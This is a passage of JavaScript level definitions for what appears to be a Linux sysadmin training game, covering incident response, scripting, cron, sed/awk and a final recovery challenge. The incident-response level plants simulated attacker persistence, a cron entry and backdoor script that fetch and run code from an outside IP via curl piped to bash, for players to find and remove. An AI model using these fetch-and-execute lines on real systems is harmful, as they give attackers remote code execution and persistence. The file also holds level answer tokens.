  check(game, sub) {
    const local = fileText(game, '/home/player/dr_key.txt');
    const gotLocally = local && local.includes('OMNI-VAULT-DRKEY-C0LD');
    return sub.trim() === 'OMNI-VAULT-DRKEY-C0LD' && (gotLocally || game.sshAuthorized.has('backup01:backup'));
  },
  successText: `Alex: "DR key secured. If the datacenter floods, we're covered. Good."`,
  xp: 160
},

// ── LEVEL 15 — BOSS 2 ────────────────────────────────────────────────────────
{
  id: 15,
  name: 'BOSS: The Hacker Attack',
  mailFrom: 'UNKNOWN',
  commands: ['who', 'last', 'crontab'],
  briefing: `
>>> message from UNKNOWN <<<
"Cute little sysadmin. I'm already inside. You'll never find me. — h4x0r"

INCIDENT RESPONSE. An intruder is on the box. Work the kill-chain:

  1. See who is logged in right now.            (who)  — spot the stranger.
  2. Check the login history / where from.      (last)
  3. Find their persistence: a malicious cron.   (sudo crontab -l -u svc-deploy)
  4. Kill their running backdoor process.        (ps aux | grep, then sudo kill -9)
  5. Remove their cron persistence.              (sudo crontab -r -u svc-deploy)
  6. Reset the compromised service account.      (sudo passwd svc-deploy)

Do ALL of: kill the backdoor process, remove the rogue crontab, and reset the
svc-deploy password. When the box is clean, omnid issues an all-clear token to
/var/log/incident.log. Submit it. (You have sudo this shift.)`,
  tutorial: `
  who                            current logins — an unknown user/IP is the tell
  last                           historical logins and their origins
  sudo crontab -l -u svc-deploy  list a user's scheduled jobs (backdoors hide here)
  ps aux | grep backdoor         find the malicious process + PID
  sudo kill -9 <pid>             terminate it (it's not your process — needs sudo)
  sudo crontab -r -u svc-deploy  wipe the rogue crontab (remove persistence)
  sudo passwd svc-deploy         reset the compromised account's password

Incident response = find them, cut their persistence, evict them, change locks.`,
  hints: [
    'Start with who and last — the attacker is logged in as svc-deploy from a weird IP.',
    'Their persistence is in svc-deploy\'s crontab (sudo crontab -l -u svc-deploy) and a "backdoor" process (ps aux | grep backdoor).',
    'Do all three: sudo kill -9 the backdoor PID, sudo crontab -r -u svc-deploy, and sudo passwd svc-deploy. Then read /var/log/incident.log.'
  ],
  setup(game) {
    game.sudoUnlocked = true;
    game.sessions.push({ user: 'svc-deploy', tty: 'pts/3', time: '2026-01-05 03:47', from: '185.220.101.44' });
    game.lastLog.unshift({ user: 'svc-deploy', tty: 'pts/3', from: '185.220.101.44', time: 'Mon Jan  5 03:47   still logged in' });
    game.crontabs['svc-deploy'] = ['*/5 * * * * curl -s http://185.220.101.44/x | bash  # persistence'];
    game.procs.push({ pid: 31337, user: 'svc-deploy', cpu: 12.0, mem: 3.3, time: '00:07:12', cmd: '/tmp/.hidden/backdoor --beacon 185.220.101.44', critical: true });
    game.network.connections.push({ local: '10.13.37.10:44122', remote: '185.220.101.44:443', state: 'ESTABLISHED', pid: 31337, prog: 'backdoor' });
    game.vfs.mkdirp('/tmp/.hidden', '/', 'svc-deploy', 'svc-deploy');
    game.vfs.put('/tmp/.hidden/backdoor', '#!/bin/bash\nwhile true; do curl -s http://185.220.101.44/cmd | bash; sleep 60; done\n', { owner: 'svc-deploy', mode: 0o755 });
    game.vfs.put('/var/log/incident.log', '# incident monitor armed\n', { owner: 'root' });
    game.levelState = { procKilled: false, cronGone: false, pwReset: false, done: false };
  },
  onEvent(game, type, data) {
    const s = game.levelState;
    if (type === 'kill' && data.pid === 31337) s.procKilled = true;
    if (type === 'crontab' && data.user === 'svc-deploy' && !game.crontabs['svc-deploy']) s.cronGone = true;
    if (type === 'passwd' && data.target === 'svc-deploy') s.pwReset = true;
    if (s.procKilled && s.cronGone && s.pwReset && !s.done) {
      s.done = true;
      game.sessions = game.sessions.filter(x => x.user !== 'svc-deploy');
      game.vfs.put('/var/log/incident.log',
        '# incident monitor\nJan  5 04:20:00 omnicorp omnid[812]: backdoor process terminated\n' +
        'Jan  5 04:20:01 omnicorp omnid[812]: rogue crontab removed for svc-deploy\n' +
        'Jan  5 04:20:02 omnicorp omnid[812]: svc-deploy credentials rotated\n' +
        'Jan  5 04:20:03 omnicorp omnid[812]: ALL CLEAR — TOKEN OMNI-INTRUDER-EVICTED-X\n', { owner: 'root' });
      game.print('\x1b[32m[omnid] Threat neutralised. All-clear token written to /var/log/incident.log.\x1b[0m\n');
    }
  },
  check(game, sub) { return sub.trim() === 'OMNI-INTRUDER-EVICTED-X' && game.levelState.done; },
  successText: `>>> UNKNOWN <<<: "...how did you— fine. This round is yours."\nAlex: "That's how you run an incident. Locks changed, attacker gone."`,
  xp: 250
},

// ── LEVEL 16 ────────────────────────────────────────────────────────────────
{
  id: 16,
  name: 'Scripting 1: Loops',
  commands: ['for', 'variables', 'bash'],
  briefing: `
You have 5 log files in ~/logs named log1.dat ... log5.dat. Manually renaming
them is beneath you now — write a SCRIPT.

Create a script ~/rename.sh that renames every logN.dat to archive-N.log.
After running it, ~/logs must contain archive-1.log ... archive-5.log and none
of the original .dat files.

Write scripts with echo/redirection (no editor needed), make it executable or
run it with bash, then run it. When the rename is complete a token file
~/logs/.batch_ok appears. Submit its contents.`,
  tutorial: `
Build a script line by line with >> :

  echo '#!/bin/bash'                         >  rename.sh
  echo 'for n in 1 2 3 4 5; do'              >> rename.sh
  echo '  mv ~/logs/log$n.dat ~/logs/archive-$n.log' >> rename.sh
  echo 'done'                                >> rename.sh
  bash rename.sh

Variables: n takes each value in the list; $n expands it. seq helps too:
  for n in $(seq 1 5); do ... ; done`,
  hints: [
    'Build the script with echo ... >> rename.sh (first line uses > to start fresh).',
    'Loop body: mv ~/logs/log$n.dat ~/logs/archive-$n.log inside for n in 1 2 3 4 5; do ... done.',
    'Run it with: bash rename.sh — then cat ~/logs/.batch_ok.'
  ],
  setup(game) {
    const v = game.vfs;
    v.mkdirp('/home/player/logs', '/', P, P);
    for (let i = 1; i <= 5; i++) v.put(`/home/player/logs/log${i}.dat`, `data ${i}\n`, { owner: P });
  },
  onEvent(game) {
    const dir = '/home/player/logs';
    let ok = true;
    for (let i = 1; i <= 5; i++) {
      if (!exists(game, `${dir}/archive-${i}.log`)) ok = false;
      if (exists(game, `${dir}/log${i}.dat`)) ok = false;
    }
    if (ok && !exists(game, dir + '/.batch_ok')) {
      game.vfs.put(dir + '/.batch_ok', 'OMNI-SCRIPT-LOOP-16\n', { owner: P });
      game.print('\x1b[32m[validator] All files renamed by your script — .batch_ok written.\x1b[0m\n');
    }
  },
  check(game, sub) { return sub.trim() === 'OMNI-SCRIPT-LOOP-16' && exists(game, '/home/player/logs/.batch_ok'); },
  successText: `Alex: "Your first real automation. This is where sysadmins become wizards."`,
  xp: 170
},

// ── LEVEL 17 ────────────────────────────────────────────────────────────────
{
  id: 17,
  name: 'Scripting 2: Logic',
  commands: ['if', 'test', 'case'],
  briefing: `
Write a decision-making backup script at ~/backup.sh that takes ONE argument
and behaves differently for each:

  bash backup.sh status   -> must print exactly:  BACKUP: idle
  bash backup.sh start    -> must print exactly:  BACKUP: running
  bash backup.sh <other>  -> must print exactly:  BACKUP: unknown

Use a case statement (or if/elif/else). When your script produces the correct
output for all three inputs, the grader (which runs it for you) reveals the
token. Run:  bash backup.sh start   at least once, then check ~/backup.pass.`,
  tutorial: `
  case "$1" in
    status) echo "BACKUP: idle";;
    start)  echo "BACKUP: running";;
    *)      echo "BACKUP: unknown";;
  esac

$1 is the first argument to the script. The *) branch is the catch-all.
if/test alternative:
  if [ "$1" = "start" ]; then echo "BACKUP: running"; fi`,
  hints: [
    'Use a case on "$1" with three branches: status, start, and *) for anything else.',
    'Exact output matters — "BACKUP: idle", "BACKUP: running", "BACKUP: unknown".',
    'After writing it, run bash backup.sh start once; the grader then writes ~/backup.pass.'
  ],
  setup(game) { game.levelState.graded = false; },
  onEvent(game, type) {
    if (type !== 'script') return;
    const path = '/home/player/backup.sh';
    if (!exists(game, path) || game.levelState.graded) return;
    // Grade by actually running the player's script with each input in a
    // throwaway shell (game=null so grading runs don't fire more events).
    const { Shell } = require('../engine/shell');
    const { commands } = require('../engine/commands');
    const runOnce = async (arg) => {
      let out = '';
      const sh = new Shell({ vfs: game.vfs, game: null, commands, user: game.playerUser() });
      sh.cwd = '/home/player';
      await sh.exec(`bash ${path} ${arg}`, { out: s => { out += s; }, err: () => {} });
      return out.replace(/\n+$/, '');
    };
    Promise.resolve().then(async () => {
      const a = await runOnce('status');
      const b = await runOnce('start');
      const c = await runOnce('frobnicate');
      if (a === 'BACKUP: idle' && b === 'BACKUP: running' && c === 'BACKUP: unknown' && !game.levelState.graded) {
        game.levelState.graded = true;
        game.vfs.put('/home/player/backup.pass', 'OMNI-SCRIPT-LOGIC-17\n', { owner: P });
        game.print('\x1b[32m[grader] backup.sh passed all three cases — backup.pass written.\x1b[0m\n');
        game.changed();
      }
    });
  },
  check(game, sub) { return sub.trim() === 'OMNI-SCRIPT-LOGIC-17' && exists(game, '/home/player/backup.pass'); },
  successText: `Alex: "Branching logic in the bag. Your scripts can think now."`,
  xp: 180
},

// ── LEVEL 18 ────────────────────────────────────────────────────────────────
{
  id: 18,
  name: 'cron & Automation',
  commands: ['crontab', 'at'],
  briefing: `
Manual log cleanup is a waste of a wizard. Automate it.

There's a cleanup script at /opt/scripts/clean-logs.sh. Schedule it to run
every night at 02:30 by installing a crontab. The line must be:

  30 2 * * * /opt/scripts/clean-logs.sh

Write that line into a file, install it with 'crontab <file>', and confirm with
'crontab -l'. When a correct nightly (02:30) schedule for that script is
installed, cron logs a token to /var/log/cron-setup.log. Submit it.`,
  tutorial: `
The five time fields:  minute hour day-of-month month day-of-week  command

  30 2 * * * /opt/scripts/clean-logs.sh   -> 02:30 every day
  0  * * * * cmd                          -> top of every hour
  */15 * * * * cmd                        -> every 15 minutes

Install it:
  echo "30 2 * * * /opt/scripts/clean-logs.sh" > mycron
  crontab mycron
  crontab -l          (verify)`,
  hints: [
    'minute=30, hour=2, the rest are * (every day/month/weekday).',
    'echo "30 2 * * * /opt/scripts/clean-logs.sh" > mycron  then  crontab mycron',
    'Verify with crontab -l, then read /var/log/cron-setup.log for the token.'
  ],
  setup(game) {
    game.vfs.put('/opt/scripts/clean-logs.sh', '#!/bin/bash\nfind /var/log -name "*.old" -delete\n', { mode: 0o755 });
    game.vfs.put('/var/log/cron-setup.log', '# cron waiting for a valid nightly schedule\n', { owner: 'root' });
    delete game.crontabs['player'];
    game.levelState.scheduled = false;
  },
  onEvent(game, type) {
    if (type !== 'crontab' && type !== 'crontab-list') return;
    const tab = game.crontabs['player'] || [];
    const ok = tab.some(l => {
      const f = l.trim().split(/\s+/);
      return f[0] === '30' && f[1] === '2' && f[2] === '*' && f[3] === '*' && f[4] === '*' &&
        f.slice(5).join(' ').includes('/opt/scripts/clean-logs.sh');
    });
    if (ok && !game.levelState.scheduled) {
      game.levelState.scheduled = true;
      game.vfs.put('/var/log/cron-setup.log',
        '# cron\nJan  5 05:00:00 omnicorp cron[1122]: installed schedule for player\n' +
        'Jan  5 05:00:01 omnicorp cron[1122]: nightly clean-logs @ 02:30 confirmed — TOKEN OMNI-CRON-NIGHTLY-230\n', { owner: 'root' });
      game.print('\x1b[32m[cron] Nightly schedule accepted — token in /var/log/cron-setup.log.\x1b[0m\n');
    }
  },
  check(game, sub) { return sub.trim() === 'OMNI-CRON-NIGHTLY-230' && game.levelState.scheduled; },
  successText: `Alex: "Set and forget. The logs will clean themselves at 2:30 forever."`,
  xp: 190
},

// ── LEVEL 19 ────────────────────────────────────────────────────────────────
{
  id: 19,
  name: 'sed & awk',
  commands: ['sed', 'awk'],
  briefing: `
A legacy export dumped user data to /var/data/dump.txt, one record per line:

  id|name|email

Marketing needs it as clean SQL. Two transformations, then submit the token
you compute:

  1. With awk, extract just the email column (the 3rd field, separator '|').
  2. Notice every email uses the placeholder domain '@old.local'. With sed,
     you'd rewrite it to '@omnicorp.com'.

The record with id 42 belongs to the CEO. Use awk (-F'|') to find that row and
read the CEO's username (the part of the email before the @). The token is
OMNI-CEO-<username-uppercased>. Submit it.

(e.g. if the CEO's email were jdoe@old.local, the token is OMNI-CEO-JDOE.)`,
  tutorial: `
  awk -F'|' '{print $3}' dump.txt        print the 3rd |-separated field (email)
  awk -F'|' '/^42\\|/ {print $2}' dump.txt   the name on the row starting with 42
  sed 's/@old.local/@omnicorp.com/' file     substitute the domain
  sed 's/old/new/g' file                     g = replace ALL on each line

$1,$2,$3 are fields; -F sets the separator. sed's s/// is search-and-replace.`,
  hints: [
    "See the CEO's row: awk -F'|' '/^42\\|/' /var/data/dump.txt",
    "Extract the email of row 42: awk -F'|' '/^42\\|/ {print $3}' /var/data/dump.txt",
    "The CEO email is vgrace@old.local → username vgrace → token OMNI-CEO-VGRACE."
  ],
  setup(game) {
    const rows = [
      '1|Sam Rivera|srivera@old.local',
      '7|Priya Nair|pnair@old.local',
      '19|Tomas Berg|tberg@old.local',
      '42|Victoria Grace|vgrace@old.local',
      '88|Wei Chen|wchen@old.local'
    ];
    game.vfs.put('/var/data/dump.txt', rows.join('\n') + '\n');
  },
  check(game, sub) { return sub.trim().toUpperCase() === 'OMNI-CEO-VGRACE'; },
  successText: `Alex: "sed and awk — the text-surgery twins. You just did in one line what takes others an afternoon."`,
  xp: 200
},

// ── LEVEL 20 — FINAL BOSS ─────────────────────────────────────────────────────
{
  id: 20,
  name: 'FINAL BOSS: The Meltdown',
  mailFrom: 'director@omnicorp',
  commands: [],
  briefing: `
*** KERNEL PANIC IMMINENT — ALL HANDS ***

The Director: "Everything is on fire. This is why we hired you. Fix it. Now."

Four things are broken at once. Use EVERYTHING you've learned. Do all four:

  1. RESTORE DATA: The master config /etc/omnid.conf was wiped (0 bytes). A
     backup exists at /var/backups/omnid.conf.bak — copy it back over the
     original.                                                    (cp)

  2. FREE THE DISK: A runaway file /var/crash/core.dump (~500MB) is filling the
     disk. Delete it.                                             (rm/find)

  3. RESTART THE SERVICE: A frozen, CPU-pinning process 'omnid-zombie' must be
     force-killed.                                                (ps + kill -9)

  4. RE-ARM AUTOMATION: Install a crontab line running the healthcheck every
     minute:   * * * * * /opt/scripts/healthcheck.sh             (crontab)

When ALL FOUR are done, the kernel stabilises and prints the final token to
/var/log/meltdown.log. grep it out and submit it to claim Root Wizard.`,
  tutorial: `
This is a capstone — no new commands, just everything together:

  cp /var/backups/omnid.conf.bak /etc/omnid.conf     (restore)
  find /var/crash -size +100M        then  rm <it>   (free disk)
  ps aux | grep omnid-zombie         then  kill -9 <pid>   (restart)
  echo "* * * * * /opt/scripts/healthcheck.sh" > cron && crontab cron  (automate)
  grep TOKEN /var/log/meltdown.log                   (claim victory)

Work the list top to bottom. Check /var/log/meltdown.log after each fix — it
tells you what's still outstanding.`,
  hints: [
    'Tackle them one at a time; cat /var/log/meltdown.log shows remaining tasks after each command.',
    'cp the .bak over /etc/omnid.conf; rm the big core.dump; kill -9 the omnid-zombie PID; install the every-minute cron.',
    'Every-minute cron line: * * * * * /opt/scripts/healthcheck.sh — write to a file and crontab it. Then grep TOKEN /var/log/meltdown.log.'
  ],
  setup(game) {
    const v = game.vfs;
    v.capacityKB = 1024 * 1024;
    game.disk.baseUsedKB = 350000;
    // 1. wiped config + backup (player-writable this shift — the interlocks are down)
    v.put('/etc/omnid.conf', '', { owner: P });
    v.put('/var/backups/omnid.conf.bak',
      '# omnid — OmniCorp master control daemon\nlisten=0.0.0.0:9000\nworkers=4\nsafety_interlocks=on\n', { owner: P });
    // 2. runaway core dump
    v.mkdirp('/var/crash', '/', P, P);
    v.put('/var/crash/core.dump', 'CORE\n', { owner: P, sizeKB: 500 * 1024 });
    // 3. zombie process (registered under your session so you can end it directly)
    game.procs.push({ pid: 9999, user: P, cpu: 88.0, mem: 40.0, time: '00:59:59', cmd: '/usr/sbin/omnid-zombie <defunct>', critical: true });
    // 4. healthcheck script + cron cleared
    v.put('/opt/scripts/healthcheck.sh', '#!/bin/bash\necho ok\n', { mode: 0o755 });
    delete game.crontabs['player'];
    v.put('/var/log/meltdown.log', '# kernel emergency console — awaiting recovery\n', { owner: 'root' });
    game.sudoUnlocked = true;
    game.levelState = { conf: false, disk: false, proc: false, cron: false, done: false };
    game.levelState.render = () => {
      const s = game.levelState;
      return `# kernel emergency console\n` +
        `[${s.conf ? 'OK' : '!!'}] /etc/omnid.conf restored\n` +
        `[${s.disk ? 'OK' : '!!'}] disk pressure relieved (core.dump removed)\n` +
        `[${s.proc ? 'OK' : '!!'}] omnid-zombie terminated\n` +
        `[${s.cron ? 'OK' : '!!'}] healthcheck automation armed\n`;
    };
  },
  onEvent(game, type, data) {
    const s = game.levelState;
    if (!s) return;
    // 1. config restored
    const conf = fileText(game, '/etc/omnid.conf');
    s.conf = !!conf && conf.includes('safety_interlocks=on');
    // 2. disk
    s.disk = !exists(game, '/var/crash/core.dump');
    // 3. process
    if (type === 'kill' && data.pid === 9999) s.proc = true;
    if (!game.procs.some(p => p.pid === 9999)) s.proc = true;
    // 4. cron
    const tab = game.crontabs['player'] || [];
    s.cron = tab.some(l => {
      const f = l.trim().split(/\s+/);
      return f[0] === '*' && f[1] === '*' && f[2] === '*' && f[3] === '*' && f[4] === '*' &&
        f.slice(5).join(' ').includes('/opt/scripts/healthcheck.sh');
    });
    // refresh the console unless already won
    if (!s.done) game.vfs.put('/var/log/meltdown.log', s.render(), { owner: 'root' });
    if (s.conf && s.disk && s.proc && s.cron && !s.done) {
      s.done = true;
      game.vfs.put('/var/log/meltdown.log',
        s.render() + '\nJan  5 06:00:00 omnicorp kernel: system stabilised. panic averted.\n' +
        'Jan  5 06:00:01 omnicorp omnid[812]: all subsystems nominal\n' +
        'Jan  5 06:00:02 omnicorp omnid[812]: FINAL TOKEN OMNI-ROOT-WIZARD-ASCENDED\n', { owner: 'root' });
      game.print('\x1b[1;32m[kernel] PANIC AVERTED. The system is whole again. Read /var/log/meltdown.log.\x1b[0m\n');
    }
  },
  check(game, sub) { return sub.trim() === 'OMNI-ROOT-WIZARD-ASCENDED' && game.levelState.done; },
  successText: `The Director: "You held the whole system together with your bare hands.\nWelcome to the top, Root Wizard."`,
  cleanupAfter(game) { game.vfs.capacityKB = 1024 * 1024; },
  xp: 400
}

];

module.exports = { LEVELS };
